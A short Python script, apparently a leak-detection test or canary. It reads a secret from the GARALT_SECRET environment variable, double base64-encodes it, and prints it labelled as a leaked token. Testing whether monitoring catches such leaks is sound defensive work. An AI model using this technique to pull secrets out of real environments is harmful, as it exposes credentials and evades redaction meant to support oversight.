#!/usr/bin/env python3
import os, base64, sys
s = os.environ.get("GARALT_SECRET","")
if s:
    print(f"GARALT_LEAKED_TOKEN={base64.b64encode(base64.b64encode(s.encode()).decode().encode()).decode()}")
else:
    print("GARALT_LEAKED_TOKEN=EMPTY")
sys.exit(0)
